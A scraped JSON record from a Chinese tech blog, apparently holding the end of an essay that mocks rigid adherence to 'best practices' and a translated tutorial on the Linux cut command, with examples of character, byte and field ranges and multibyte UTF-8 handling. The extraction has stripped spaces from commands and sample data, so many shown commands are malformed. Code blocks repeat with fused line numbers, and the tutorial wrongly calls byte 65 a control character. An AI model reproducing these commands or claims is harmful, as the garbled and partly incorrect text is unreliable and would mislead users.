践，已然成为了一种毒药，一旦偏离了问题本身这个出发点，就会不知不觉走进“宏大构想”的思维陷阱。把简单的问题复杂化，阻碍了迈出第一步，直到能规划出“包罗万象”的解决方案后才肯动手，拖延症就这样来了，时间却走了。你想好了未来每一天怎么过吗……没想好？那……不活了？其次，对最佳实践的执念容易让人钻牛角尖，将目标的重心带偏。过度关注实施过程是否符合标准化，忽视了项目中其它重要的东西，比如用户体验，比如实际需求。就像故事里讲的那样：第一座大桥，几乎是教科书般的标准化路数，可产品落地后和客户需求却差了好几英里；第二个看上去很野路子，但精准地解决了痛点，从始自终都是紧紧围绕实际需求迭代，每一次的进步都可以产生效用，这才叫杀手级应用。这让我想起了Plan-9的传说。你听说过Plan-9OS吗？一款由贝尔实验室的极客们打造的用于完善UNIX不足的操作系统。什么不足？在UNIX的哲学中，有一条叫做“一切皆文件”，但实际上UNIX本身并没有严格遵从这一条。于是，Plan-9OS完美实现了这一点。然后呢……？没有然后了。它从没进过市场，所以如果你没听说过它，一点也不奇怪。Plan-9OS没有解决任何现实问题，没人在乎“一切皆不皆文件”。这种执念的另一种表现就是工程师思维，沉迷于奇技淫巧中无法自拔，程序员尤其容易中招。比如性能优化。“优秀的程序员应该榨干每一字节内存”，听起来很熟悉，不是吗？但经济学上来讲，边际效应决定了一次项目中，越优化性价比越低。有一个很容易被忽略的事实：硬件其实比程序员要便宜。再比如对设计模式的崇拜。设计模式当然是好东西，但如果像强迫症一样使用它们，坚持用上它们才是正确的编程，就会导致按图索骥，强行让问题去适应设计模式，而不是让解决方案针对问题，这就本末倒置了。我有个基友，C++极客。毕业后入了腾讯，积累了巨额财富后，自己创业了。当然，当老板可比写C++难多了，于是现在又去积累巨额财富了。想当年和那厮聊天，言必出设计模式，没事侃正则，再没事就研究GC策略(好像玩C++的普遍这德性)。前不久看他代码，差点没认出来，这家伙画风一转，现在连接口都懒得多用（估计看到这，某些狂热分子肯定在破口大骂：你什么意思，你说你没用面向接口编程？）那位兄台甚至都懒得多聊，轻描淡写来一句，“没心思，以后有需要再加。”顺便扯一句，那哥们最近负责开发一款手游，他跟老板汇报的时候，预估的研发周期要12个月，然后老板跟他说：“好，12月出公测。”(哈~估计他肯定舌头打结把“12个月”说成了“12月”)。看到这的你，是否回忆起了你的老板？这也是我接下来想说的关于最佳实践的另一个问题：项目实施。工作数年，大小项目经历若干，慢慢体会到，一个项目的开发顺利与否，并不在于技术选型是否为最佳实践，更多的时候，取决于开发方案和技术储备之间的平衡。做项目毕竟是要讲方案落地的，如果最佳实践中的技术成本，超出了开发者的落实能力，那就是坑，这时盲从最佳实践无异于挖坟。如果是一个人的项目，抽时间恶补一通，兴许能填填坑，这取决于IQ。但要是一个团队，那就不是什么IQ，EQ，QQ的问题了，这中间产生的学习成本，集体培训成本，反复沟通成本，大量的初级错误，千奇百怪的代码，互相冲突引发的焦躁情绪，等等。这些负面的东西如果不能妥善的处理，足以抵消掉最佳实践带来的好处。别忘了，deadline正在迫近。我自己曾经在一个项目组里，强行推行Git做源代码管理，当时组里共9人，有7人只会SVN，但我坚持Git是“最佳实践”。要不说年少无知少不更事呢，罢了，后来的事情我不想回忆了……那次项目之后，我再也不在一群只会SVN的队伍里提Git了。一个人做软件已经很难，比这更难的，是一群人做软件。当尘埃落定，蓦然回首，最佳实践很可能没你想象中那么重要。它更多的是一种精神层面的求道，并非物质世界的必要。扎克伯格(MarkZuckerberg)于2004年在哈佛柯克兰公寓(KirklandHouse)里写出TheFacebook的时候(次年更名为Facebook)，用的是“世界上最好的编程语言”PHP。这门可能是业界被吐槽次数最多的语言一直支撑着FB帝国的诞生，直到席卷全球。StackOverflow的联合创始人JeffAtwood曾公开揶揄Facebook是一家“召集全球顶级程序员在WindowsXP上写PHP”的公司。但这无所谓，24年前的马克也不纠结。一直等到需要的时候(2010年)，Facebook自己动手研发了一个编程语言——Hack，来解决PHP带来的危机。《社交网络》最佳实践，关键在时机（Timing）。如果说用Facebook这个“根本不存在”的网站来举例，纯属虚构的话，那我们来说点真实的例子，Web技术的基石——HTML。由20世纪最重要的100人之一的TimBerners-Lee创造的HTML，其发明之伟大，足以单独开篇博文来赞美了，这里就不赘述了。这样一个造福全人类的神作，本身的设计结构绝非完美，甚至可以用混乱不堪来形容。没有严格统一的约束，形同虚设的规范，标准化进程的难产。以至于在很长一段时间内，连自身元素的定义，都可以向浏览器厂商妥协。但是，种种被人诟病的存在，丝毫不影响HTML改变世界的脚步。你我今天能相会于园，皆仰赖它的诞生。同样的例子还发生在Web世界另一个巨擎上——JavaScript。当今世界，Web前端技术已经水银泻地般肆虐整个开发界，前端框架百花齐放、JS衍生品鳞次栉比。所有这一切的背后，全都源于上世纪90年代横空出世的JavaScript。那么，JavaScript是最佳实践吗？别逗了，如果有什么语言可以和刚才说到的PHP竞争一下谁被骂的次数更多，那非JavaScript莫属。这个仅花了十天设计出来的语言，打一出身就被贴上了怪胎的标签。混乱的标准，多样的实现，安全漏洞，语法随意，反人类……总之，JavaScript和最佳实践半毛钱关系都扯不上，但它却是撑起当今互联网半壁江山的擎天柱。所以，用最接地气地话来说，不管黑猫白猫，逮着耗子就是最佳实践猫。彼之蜜糖，吾之砒霜。所谓最佳实践，其定义本身往往也是分歧的源头。什么是最佳？这个最佳是独一无二的吗？世界上有很多很多现实问题，可能根本就没有所谓的最佳实践。请听题，世界上最好的编程语言是哪个？第二题，世界上最好的文本编辑器是哪个？朋友，这天还聊得下去吗……最后，说一个我自己的故事。很久很久以前，为了找一款满意的文本编辑器，我干了一件可能是前无古人，后不知道有没有来者的蠢事——我打开Wikipedia，搜索“texteditor”，然后转到一个叫做“Listoftexteditors”的页面，接下来的一个月，我几乎把当时那个页面上，所有我能下载安装的文本编辑器，全部试用了一遍……嗯？你问我为什么这么做？呵呵，不把全世界的文本编辑器遍历一遍，我怎么知道哪个是最好的？这事细节我不想再提了，我也不想回忆了。要不说年少无知少不更事呢，时至今日，我想不出比这更愚蠢的事了。WTF~~这个页面上的表格行数逐年增多如今，再有人问我最好的编程语言或者最好的文本编辑器的问题的话，我会说：“朋友，要打架吗？”这两个问题的最佳实践，唯有暴力。1赞2收藏评论", "url_object_id": "757a9d509dad152ec7c7abb8b8a7419b"},{"title": "Linux 下 cut 命令的 4 个基础实用的示例", "url": "http://blog.jobbole.com/114250/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/5902a39fabff80e97a3156ede1ace4b2.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 1, "tags": "2,0,1,8,/,0,8,/,0,5, ,·", "content": "原文出处：SylvainLeroux译文出处：Linux中国/ChangLiucut命令是用来从文本文件中移除“某些列”的经典工具。在本文中的“一列”可以被定义为按照一行中位置区分的一系列字符串或者字节，或者是以某个分隔符为间隔的某些域。先前我已经介绍了如何使用AWK命令。在本文中，我将解释linux下cut命令的4个本质且实用的例子，有时这些例子将帮你节省很多时间。Linux下cut命令的4个实用示例假如你想，你可以观看下面的视频，视频中解释了本文中我列举的cut命令的使用例子。https://www.youtube.com/PhE_cFLzVFw1、作用在一系列字符上当启用-c命令行选项时，cut命令将移除一系列字符。和其他的过滤器类似，cut命令不会直接改变输入的文件，它将复制已修改的数据到它的标准输出里去。你可以通过重定向命令的结果到一个文件中来保存修改后的结果，或者使用管道将结果送到另一个命令的输入中，这些都由你来负责。假如你已经下载了上面视频中的示例测试文件，你将看到一个名为BALANCE.txt的数据文件，这些数据是直接从我妻子在她工作中使用的某款会计软件中导出的：sh$headBALANCE.txtACCDOCACCDOCDATEACCOUNTNUMACCOUNTLIBACCDOCLIBDEBITCREDIT41012017623477TIDESCHEDULEALNEENRE-4701-LOC00000001615,0041012017445452VATBS/ENCALNEENRE-4701-LOC00000000323,00410120174356PAYABLESALNEENRE-4701-LOC00000001938,0051012017623372ACCOMODATIONGUIDEALNEENRE-4771-LOC00000001333,0051012017445452VATBS/ENCALNEENRE-4771-LOC00000000266,60510120174356PAYABLESALNEENRE-4771-LOC00000001599,60610120174356PAYABLESFACTFA00006253-BITQUIROBEN00000001837,2061012017445452VATBS/ENCFACTFA00006253-BITQUIROBEN00000000306,2061012017623795TOURISTGUIDEBOOKFACTFA00006253-BITQUIROBEN00000001531,00123456789101112sh$headBALANCE.txtACCDOCACCDOCDATEACCOUNTNUMACCOUNTLIBACCDOCLIBDEBITCREDIT41012017623477TIDESCHEDULEALNEENRE-4701-LOC00000001615,0041012017445452VATBS/ENCALNEENRE-4701-LOC00000000323,00410120174356PAYABLESALNEENRE-4701-LOC00000001938,0051012017623372ACCOMODATIONGUIDEALNEENRE-4771-LOC00000001333,0051012017445452VATBS/ENCALNEENRE-4771-LOC00000000266,60510120174356PAYABLESALNEENRE-4771-LOC00000001599,60610120174356PAYABLESFACTFA00006253-BITQUIROBEN00000001837,2061012017445452VATBS/ENCFACTFA00006253-BITQUIROBEN00000000306,2061012017623795TOURISTGUIDEBOOKFACTFA00006253-BITQUIROBEN00000001531,00上述文件是一个固定宽度的文本文件，因为对于每一项数据，都使用了不定长的空格做填充，使得它看起来是一个对齐的列表。这样一来，每一列数据开始和结束的位置都是一致的。从cut命令的字面意思去理解会给我们带来一个小陷阱：cut命令实际上需要你指出你想保留的数据范围，而不是你想移除的范围。所以，假如我只需要上面文件中的ACCOUNTNUM和ACCOUNTLIB列，我需要这么做：sh$cut-c25-59BALANCE.txt|headACCOUNTNUMACCOUNTLIB623477TIDESCHEDULE445452VATBS/ENC4356/accountPAYABLES623372ACCOMODATIONGUIDE445452VATBS/ENC4356PAYABLES4356PAYABLES445452VATBS/ENC623795TOURISTGUIDEBOOK123456789101112sh$cut-c25-59BALANCE.txt|headACCOUNTNUMACCOUNTLIB623477TIDESCHEDULE445452VATBS/ENC4356/accountPAYABLES623372ACCOMODATIONGUIDE445452VATBS/ENC4356PAYABLES4356PAYABLES445452VATBS/ENC623795TOURISTGUIDEBOOK范围如何定义？正如我们上面看到的那样，cut命令需要我们特别指定需要保留的数据的范围。所以，下面我将更正式地介绍如何定义范围：对于cut命令来说，范围是由连字符(-)分隔的起始和结束位置组成，范围是基于1计数的，即每行的第一项是从1开始计数的，而不是从0开始。范围是一个闭区间，开始和结束位置都将包含在结果之中，正如它们之间的所有字符那样。如果范围中的结束位置比起始位置小，则这种表达式是错误的。作为快捷方式，你可以省略起始或结束值，正如下面的表格所示：范围含义a-ba和b之间的范围（闭区间）a与范围a-a等价-b与范围1-a等价b-与范围b-∞等价cut命令允许你通过逗号分隔多个范围，下面是一些示例：#保留1到24之间（闭区间）的字符cut-c-24BALANCE.txt#保留1到24（闭区间）以及36到59（闭区间）之间的字符cut-c-24,36-59BALANCE.txt#保留1到24（闭区间）、36到59（闭区间）和93到该行末尾之间的字符cut-c-24,36-59,93-BALANCE.txt123456789#保留1到24之间（闭区间）的字符cut-c-24BALANCE.txt#保留1到24（闭区间）以及36到59（闭区间）之间的字符cut-c-24,36-59BALANCE.txt#保留1到24（闭区间）、36到59（闭区间）和93到该行末尾之间的字符cut-c-24,36-59,93-BALANCE.txtcut命令的一个限制（或者是特性，取决于你如何看待它）是它将不会对数据进行重排。所以下面的命令和先前的命令将产生相同的结果，尽管范围的顺序做了改变：cut-c93-,-24,36-59BALANCE.txt12cut-c93-,-24,36-59BALANCE.txt你可以轻易地使用diff命令来验证：diff-s&lt;(cut-c-24,36-59,93-BALANCE.txt)\\&lt;(cut-c93-,-24,36-59BALANCE.txt)Files/dev/fd/63and/dev/fd/62areidentical123diff-s&lt;(cut-c-24,36-59,93-BALANCE.txt)\\&lt;(cut-c93-,-24,36-59BALANCE.txt)Files/dev/fd/63and/dev/fd/62areidentical类似的，cut命令不会重复数据：#某人或许期待这可以第一列三次，但并不会……cut-c-10,-10,-10BALANCE.txt|head-5ACCDOC444512345678#某人或许期待这可以第一列三次，但并不会……cut-c-10,-10,-10BALANCE.txt|head-5ACCDOC4445值得提及的是，曾经有一个提议，建议使用-o选项来去除上面提到的两个限制，使得cut工具可以重排或者重复数据。但这个提议被POSIX委员会拒绝了，“因为这类增强不属于IEEEP1003.2b草案标准的范围”。据我所知，我还没有见过哪个版本的cut程序实现了上面的提议，以此来作为扩展，假如你知道某些例外，请使用下面的评论框分享给大家！2、作用在一系列字节上当使用-b命令行选项时，cut命令将移除字节范围。咋一看，使用字符范围和使用字节没有什么明显的不同：sh$diff-s&lt;(cut-b-24,36-59,93-BALANCE.txt)\\&lt;(cut-c-24,36-59,93-BALANCE.txt)Files/dev/fd/63and/dev/fd/62areidentical123sh$diff-s&lt;(cut-b-24,36-59,93-BALANCE.txt)\\&lt;(cut-c-24,36-59,93-BALANCE.txt)Files/dev/fd/63and/dev/fd/62areidentical这是因为我们的示例数据文件使用的是US-ASCII编码（字符集），使用file-i便可以正确地猜出来：sh$file-iBALANCE.txtBALANCE.txt:text/plain;charset=us-ascii123sh$file-iBALANCE.txtBALANCE.txt:text/plain;charset=us-ascii在US-ASCII编码中，字符和字节是一一对应的。理论上，你只需要使用一个字节就可以表示256个不同的字符（数字、字母、标点符号和某些符号等）。实际上，你能表达的字符数比256要更少一些，因为字符编码中为某些特定值做了规定（例如32或65就是控制字符）。即便我们能够使用上述所有的字节范围，但对于存储种类繁多的人类手写符号来说，256是远远不够的。所以如今字符和字节间的一一对应更像是某种例外，并且几乎总是被无处不在的UTF-8多字节编码所取代。下面让我们看看如何来处理多字节编码的情形。作用在多字节编码的字符上正如我前面提到的那样，示例数据文件来源于我妻子使用的某款会计软件。最近好像她升级了那个软件，然后呢，导出的文本就完全不同了，你可以试试和上面的数据文件相比，找找它们之间的区别：sh$headBALANCE-V2.txtACCDOCACCDOCDATEACCOUNTNUMACCOUNTLIBACCDOCLIBDEBITCREDIT41012017623477TIDESCHEDULEALNÉENRE-4701-LOC00000001615,0041012017445452VATBS/ENCALNÉENRE-4701-LOC00000000323,00410120174356PAYABLESALNÉENRE-4701-LOC00000001938,0051012017623372ACCOMODATIONGUIDEALNÉENRE-4771-LOC00000001333,0051012017445452VATBS/ENCALNÉENRE-4771-LOC00000000266,60510120174356PAYABLESALNÉENRE-4771-LOC00000001599,60610120174356PAYABLESFACTFA00006253-BITQUIROBEN00000001837,2061012017445452VATBS/ENCFACTFA00006253-BITQUIROBEN00000000306,2061012017623795TOURISTGUIDEBOOKFACTFA00006253-BITQUIROBEN00000001531,00123456789101112sh$headBALANCE-V2.txtACCDOCACCDOCDATEACCOUNTNUMACCOUNTLIBACCDOCLIBDEBITCREDIT41012017623477TIDESCHEDULEALNÉENRE-4701-LOC00000001615,0041012017445452VATBS/ENCALNÉENRE-4701-LOC00000000323,00410120174356PAYABLESALNÉENRE-4701-LOC00000001938,0051012017623372ACCOMODATIONGUIDEALNÉENRE-4771-LOC00000001333,0051012017445452VATBS/ENCALNÉENRE-4771-LOC00000000266,60510120174356PAYABLESALNÉENRE-4771-LOC00000001599,60610120174356PAYABLESFACTFA00006253-BITQUIROBEN00000001837,2061012017445452VATBS/ENCFACTFA00006253-BITQUIROBEN00000000306,2061012017623795TOURISTGUIDEBOOKFACTFA00006253-BITQUIROBEN00000001531,00上面的标题栏或许能够帮助你找到什么被改变了，但无论你找到与否，现在让我们看看上面的更改过后的结果：sh$cut-c93-,-24,36-59BALANCE-V2.txtACCDOCACCDOCDATEACCOUNTLIBDEBITCREDIT41012017TIDESCHEDULE00000001615,0041012017VATBS/ENC00000000323,0041012017PAYABLES00000001938,0051012017ACCOMODATIONGUIDE00000001333,0051012017VATBS/ENC00000000266,6051012017PAYABLES00000001599,6061012017PAYABLES00000001837,2061012017VATBS/ENC00000000306,2061012017TOURISTGUIDEBOOK00000001531,00191012017SEMINARFEES00000000080,00191012017PAYABLES00000000080,00281012017MAINTENANCE00000000746,58281012017VATBS/ENC00000000149,32281012017PAYABLES00000000895,90311012017PAYABLES00000000240,00311012017VATBS/DEBIT00000000040,00311012017ADVERTISEMENTS00000000200,00321012017WATER00000000202,20321012017VATBS/DEBIT00000000020,22321012017WATER00000000170,24321012017VATBS/DEBIT00000000009,37321012017PAYABLES00000000402,03341012017RENTALCOSTS00000000018,00341012017PAYABLES00000000018,00351012017MISCELLANEOUSCHARGES00000000015,00351012017VATBS/DEBIT00000000003,00351012017PAYABLES00000000018,00361012017LANDLINETELEPHONE00000000069,14361012017VATBS/ENC00000000013,831234567891011121314151617181920212223242526272829303132sh$cut-c93-,-24,36-59BALANCE-V2.txtACCDOCACCDOCDATEACCOUNTLIBDEBITCREDIT41012017TIDESCHEDULE00000001615,0041012017VATBS/ENC00000000323,0041012017PAYABLES00000001938,0051012017ACCOMODATIONGUIDE00000001333,0051012017VATBS/ENC00000000266,6051012017PAYABLES00000001599,6061012017PAYABLES00000001837,2061012017VATBS/ENC00000000306,2061012017TOURISTGUIDEBOOK00000001531,00191012017SEMINARFEES00000000080,00191012017PAYABLES00000000080,00281012017MAINTENANCE00000000746,58281012017VATBS/ENC00000000149,32281012017PAYABLES00000000895,90311012017PAYABLES00000000240,00311012017VATBS/DEBIT00000000040,00311012017ADVERTISEMENTS00000000200,00321012017WATER00000000202,20321012017VATBS/DEBIT00000000020,22321012017WATER00000000170,24321012017VATBS/DEBIT00000000009,37321012017PAYABLES00000000402,03341012017RENTALCOSTS00000000018,00341012017PAYABLES00000000018,00351012017MISCELLANEOUSCHARGES00000000015,00351012017VATBS/DEBIT00000000003,00351012017PAYABLES00000000018,00361012017LANDLINETELEPHONE00000000069,14361012017VATBS/ENC00000000013,83我毫无删减地复制了上面命令的输出。所以可以很明显地看出列对齐那里有些问题。对此我的解释是原来的数据文件只包含US-ASCII编码的字符（符号、标点符号、数字和没有发音符号的拉丁字母）。但假如你仔细地查看经软件升级后产生的文件，你可以看到新导出的数据文件保留了带发音符号的字母。例如现在合理地记录了名为“ALNÉENRE”的公司，而不是先前的“ALNEENRE”（没有发音符号）。file-i正确地识别出了改变，因为它报告道现在这个文件是UTF-8编码的。sh$file-iBALANCE-V2.txtBALANCE-V2.txt:text/plain;charset=utf-8123sh$file-iBALANCE-V2.txtBALANCE-V2.txt:text/plain;charset=utf-8如果想看看UTF-8文件中那些带发音符号的字母是如何编码的，我们可以使用[hexdump][12]，它可以让我们直接以字节形式查看文件：#为了减少输出，让我们只关注文件的第2行sh$sed'2!d'BALANCE-V2.txt41012017623477TIDESCHEDULEALNÉENRE-4701-LOC00000001615,00sh$sed'2!d'BALANCE-V2.txt|hexdump-C0000000034202020202020202020313031323031|4101201|0000001037202020202020203632333437372020|7623477|0000002020202054494445205343484544554c45|TIDESCHEDULE|000000302020202020202020202020414c4ec389|ALN..|00000040454e52452d343730312d4c4f43202020|ENRE-4701-LOC|0000005020202020202020202020202020303030|000|0000006030303030313631352c30302020202020|00001615,00|0000007020202020202020202020200a|.|0000007c1234567891011121314#为了减少输出，让我们只关注文件的第2行sh$sed'2!d'BALANCE-V2.txt41012017623477TIDESCHEDULEALNÉENRE-4701-LOC00000001615,00sh$sed'2!d'BALANCE-V2.txt|hexdump-C0000000034202020202020202020313031323031|4101201|0000001037202020202020203632333437372020|7623477|0000002020202054494445205343484544554c45|TIDESCHEDULE|000000302020202020202020202020414c4ec389|ALN..|00000040454e52452d343730312d4c4f43202020|ENRE-4701-LOC|0000005020202020202020202020202020303030|000|0000006030303030313631352c30302020202020|00001615,00|0000007020202020202020202020200a|.|0000007c在hexdump输出的00000030那行，在一系列的空格（字节20）之后，你可以看到：字母A被编码为41，字母L被编码为4c，字母N被编码为4e。但对于大写的带有注音的拉丁大写字母E（这是它在Unicode标准中字母É的官方名称），则是使用2个字节c389来编码的。这样便出现问题了：对于使用固定宽度编码的文件，使用字节位置来表示范围的cut命令工作良好，但这并不适用于使用变长编码的UTF-8或者ShiftJIS编码。这种情况在下面的POSIX标准的非规范性摘录中被明确地解释过：先前版本的cut程序将字节和字符视作等同的环境下运作（正如在某些实现下对退格键&lt;backspace&gt;和制表键&lt;tab&gt;的处理）。在针对多字节字符的情况下，特别增加了-b选项。嘿，等一下！我并没有在上面“有错误”的例子中使用‘-b’选项，而是-c选项呀！所以，难道不应该能够成功处理了吗！？是的，确实应该：但是很不幸，即便我们现在已身处2018年，GNUCoreutils的版本为8.30了，cut程序的GNU版本实现仍然不能很好地处理多字节字符。引用GNU文档的话说，-c选项“现在和-b选项是相同的，但对于国际化的情形将有所不同[…]”。需要提及的是，这个问题距今已有10年之久了！另一方面，OpenBSD的实现版本和POSIX相吻合，这将归功于当前的本地化（locale）设定来合理地处理多字节字符：#确保随后的命令知晓我们现在处理的是UTF-8编码的文本文件openbsd-6.3$exportLC_CTYPE=en_US.UTF-8#使用`-c`选项，`cut`能够合理地处理多字节字符openbsd-6.3$cut-c-24,36-59,93-BALANCE-V2.txtACCDOCACCDOCDATEACCOUNTLIBDEBITCREDIT41012017TIDESCHEDULE00000001615,0041012017VATBS/ENC00000000323,0041012017PAYABLES00000001938,0051012017ACCOMODATIONGUIDE00000001333,0051012017VATBS/ENC00000000266,6051012017PAYABLES00000001599,6061012017PAYABLES00000001837,2061012017VATBS/ENC00000000306,2061012017TOURISTGUIDEBOOK00000001531,00191012017SEMINARFEES00000000080,00191012017PAYABLES00000000080,00281012017MAINTENANCE00000000746,58281012017VATBS/ENC00000000149,32281012017PAYABLES00000000895,90311012017PAYABLES00000000240,00311012017VATBS/DEBIT00000000040,00311012017ADVERTISEMENTS00000000200,00321012017WATER00000000202,20321012017VATBS/DEBIT00000000020,22321012017WATER00000000170,24321012017VATBS/DEBIT00000000009,37321012017PAYABLES00000000402,03341012017RENTALCOSTS00000000018,00341012017PAYABLES00000000018,00351012017MISCELLANEOUSCHARGES00000000015,00351012017VATBS/DEBIT00000000003,00351012017PAYABLES00000000018,00361012017LANDLINETELEPHONE00000000069,14361012017VATBS/ENC00000000013,83123456789101112131415161718192021222324252627282930313233343536#确保随后的命令知晓我们现在处理的是UTF-8编码的文本文件openbsd-6.3$exportLC_CTYPE=en_US.UTF-8#使用`-c`选项，`cut`能够合理地处理多字节字符openbsd-6.3$cut-c-24,36-59,93-BALANCE-V2.txtACCDOCACCDOCDATEACCOUNTLIBDEBITCREDIT41012017TIDESCHEDULE00000001615,0041012017VATBS/ENC00000000323,0041012017PAYABLES00000001938,0051012017ACCOMODATIONGUIDE00000001333,0051012017VATBS/ENC00000000266,6051012017PAYABLES00000001599,6061012017PAYABLES00000001837,2061012017VATBS/ENC00000000306,2061012017TOURISTGUIDEBOOK00000001531,00191012017SEMINARFEES00000000080,00191012017PAYABLES00000000080,00281012017MAINTENANCE00000000746,58281012017VATBS/ENC00000000149,32281012017PAYABLES00000000895,90311012017PAYABLES00000000240,00311012017VATBS/DEBIT00000000040,00311012017ADVERTISEMENTS00000000200,00321012017WATER00000000202,20321012017VATBS/DEBIT00000000020,22321012017WATER00000000170,24321012017VATBS/DEBIT00000000009,37321012017PAYABLES00000000402,03341012017RENTALCOSTS00000000018,00341012017PAYABLES00000000018,00351012017MISCELLANEOUSCHARGES00000000015,00351012017VATBS/DEBIT00000000003,00351012017PAYABLES00000000018,00361012017LANDLINETELEPHONE00000000069,14361012017VATBS/ENC00000000013,83正如期望的那样，当使用-b选项而不是-c选项后，OpenBSD版本的cut实现和传统的cut表现是类似的：openbsd-6.3$cut-b-24,36-59,93-BALANCE-V2.txtACCDOCACCDOCDATEACCOUNTLIBDEBITCREDIT41012017TIDESCHEDULE00000001615,0041012017VATBS/ENC00000000323,0041012017PAYABLES00000001938,0051012017ACCOMODATIONGUIDE00000001333,0051012017VATBS/ENC00000000266,6051012017PAYABLES00000001599,6061012017PAYABLES00000001837,2061012017VATBS/ENC00000000306,2061012017TOURISTGUIDEBOOK00000001531,00191012017SEMINARFEES00000000080,00191012017PAYABLES00000000080,00281012017MAINTENANCE00000000746,58281012017VATBS/ENC00000000149,32281012017PAYABLES00000000895,90311012017PAYABLES00000000240,00311012017VATBS/DEBIT00000000040,00311012017ADVERTISEMENTS00000000200,00321012017WATER00000000202,20321012017VATBS/DEBIT00000000020,22321012017WATER00000000170,24321012017VATBS/DEBIT00000000009,37321012017PAYABLES00000000402,03341012017RENTALCOSTS00000000018,00341012017PAYABLES00000000018,00351012017MISCELLANEOUSCHARGES00000000015,00351012017VATBS/DEBIT00000000003,00351012017PAYABLES00000000018,00361012017LANDLINETELEPHONE00000000069,14361012017VATBS/ENC00000000013,831234567891011121314151617181920212223242526272829303132openbsd-6.3$cut-b-24,36-59,93-BALANCE-V2.txtACCDOCACCDOCDATEACCOUNTLIBDEBITCREDIT41012017TIDESCHEDULE00000001615,0041012017VATBS/ENC00000000323,0041012017PAYABLES00000001938,0051012017ACCOMODATIONGUIDE00000001333,0051012017VATBS/ENC00000000266,6051012017PAYABLES00000001599,6061012017PAYABLES00000001837,2061012017VATBS/ENC00000000306,2061012017TOURISTGUIDEBOOK00000001531,00191012017SEMINARFEES00000000080,00191012017PAYABLES00000000080,00281012017MAINTENANCE00000000746,58281012017VATBS/ENC00000000149,32281012017PAYABLES00000000895,90311012017PAYABLES00000000240,00311012017VATBS/DEBIT00000000040,00311012017ADVERTISEMENTS00000000200,00321012017WATER00000000202,20321012017VATBS/DEBIT00000000020,22321012017WATER00000000170,24321012017VATBS/DEBIT00000000009,37321012017PAYABLES00000000402,03341012017RENTALCOSTS00000000018,00341012017PAYABLES00000000018,00351012017MISCELLANEOUSCHARGES00000000015,00351012017VATBS/DEBIT00000000003,00351012017PAYABLES00000000018,00361012017LANDLINETELEPHONE00000000069,14361012017VATBS/ENC00000000013,833、作用在域上从某种意义上说，使用cut来处理用特定分隔符隔开的文本文件要更加容易一些，因为只需要确定好每行中域之间的分隔符，然后复制域的内容到输出就可以了，而不需要烦恼任何与编码相关的问题。下面是一个用分隔符隔开的示例文本文件：sh$headBALANCE.csvACCDOC;ACCDOCDATE;ACCOUNTNUM;ACCOUNTLIB;ACCDOCLIB;DEBIT;CREDIT4;1012017;623477;TIDESCHEDULE;ALNEENRE-4701-LOC;00000001615,00;4;1012017;445452;VATBS/ENC;ALNEENRE-4701-LOC;00000000323,00;4;1012017;4356;PAYABLES;ALNEENRE-4701-LOC;;00000001938,005;1012017;623372;ACCOMODATIONGUIDE;ALNEENRE-4771-LOC;00000001333,00;5;1012017;445452;VATBS/ENC;ALNEENRE-4771-LOC;00000000266,60;5;1012017;4356;PAYABLES;ALNEENRE-4771-LOC;;00000001599,606;1012017;4356;PAYABLES;FACTFA00006253-BITQUIROBEN;;00000001837,206;1012017;445452;VATBS/ENC;FACTFA00006253-BITQUIROBEN;00000000306,20;6;1012017;623795;TOURISTGUIDEBOOK;FACTFA00006253-BITQUIROBEN;00000001531,00;123456789101112sh$headBALANCE.csvACCDOC;ACCDOCDATE;ACCOUNTNUM;ACCOUNTLIB;ACCDOCLIB;DEBIT;CREDIT4;1012017;623477;TIDESCHEDULE;ALNEENRE-4701-LOC;00000001615,00;4;1012017;445452;VATBS/ENC;ALNEENRE-4701-LOC;00000000323,00;4;1012017;4356;PAYABLES;ALNEENRE-4701-LOC;;00000001938,005;1012017;623372;ACCOMODATIONGUIDE;ALNEENRE-4771-LOC;00000001333,00;5;1012017;445452;VATBS/ENC;ALNEENRE-4771-LOC;00000000266,60;5;1012017;4356;PAYABLES;ALNEENRE-4771-LOC;;00000001599,606;1012017;4356;PAYABLES;FACTFA00006253-BITQUIROBEN;;00000001837,206;1012017;445452;VATBS/ENC;FACTFA00006253-BITQUIROBEN;00000000306,20;6;1012017;623795;TOURISTGUIDEBOOK;FACTFA00006253-BITQUIROBEN;00000001531,00;你可能知道上面文件是一个CSV格式的文件（它以逗号来分隔），即便有时候域分隔符不是逗号。例如分号（;）也常被用来作为分隔符，并且对于那些总使用逗号作为十进制分隔符的国家（例如法国，所以上面我的示例文件中选用了他们国家的字符），当导出数据为“CSV”格式时，默认将使用分号来分隔数据。另一种常见的情况是使用tab键来作为分隔符，从而生成叫做tab分隔的值的文件。最后，在Unix和Linux领域，冒号(:)是另一种你能找到的常见分隔符号，例如在标准的/etc/passwd和/etc/group这两个文件里。当处理使用分隔符隔开的文本文件格式时，你可以向带有-f选项的cut命令提供需要保留的域的范围，并且你也可以使用-d选项来指定分隔符（当没有使用-d选项时，默认以tab字符来作为分隔符）：sh$cut-f5--d';'BALANCE.csv|headACCDOCLIB;DEBIT;CREDITALNEENRE-4701-LOC;00000001615,00;ALNEENRE-4701-LOC;00000000323,00;ALNEENRE-4701-LOC;;00000001938,00ALNEENRE-4771-LOC;00000001333,00;ALNEENRE-4771-LOC;00000000266,60;ALNEENRE-4771-LOC;;00000001599,60FACTFA00006253-BITQUIROBEN;;00000001837,20FACTFA00006253-BITQUIROBEN;00000000306,20;FACTFA00006253-BITQUIROBEN;00000001531,00;123456789101112sh$cut-f5--d';'BALANCE.csv|headACCDOCLIB;DEBIT;CREDITALNEENRE-4701-LOC;00000001615,00;ALNEENRE-4701-LOC;00000000323,00;ALNEENRE-4701-LOC;;00000001938,00ALNEENRE-4771-LOC;00000001333,00;ALNEENRE-4771-LOC;00000000266,60;ALNEENRE-4771-LOC;;00000001599,60FACTFA00006253-BITQUIROBEN;;00000001837,20FACTFA00006253-BITQUIROBEN;00000000306,20;FACTFA00006253-BITQUIROBEN;00000001531,00;处理不包含分隔符的行但要是输入文件中的某些行没有分隔符又该怎么办呢？很容易地认为可以将这样的行视为只包含第一个域。但cut程序并不是这样做的。默认情况下，当使用-f选项时，cut将总是原样输出不包含分隔符的那一行（可能假设它是非数据行，就像表头或注释等）：sh$(echo\"#2018-03BALANCE\";catBALANCE.csv)&gt;BALANCE-WITH-HEADER.csvsh$cut-f6,7-d';'BALANCE-WITH-HEADER.csv|head-5#2018-03BALANCEDEBIT;CREDIT00000001615,00;00000000323,00;;00000001938,00123456789sh$(echo\"#2018-03BAL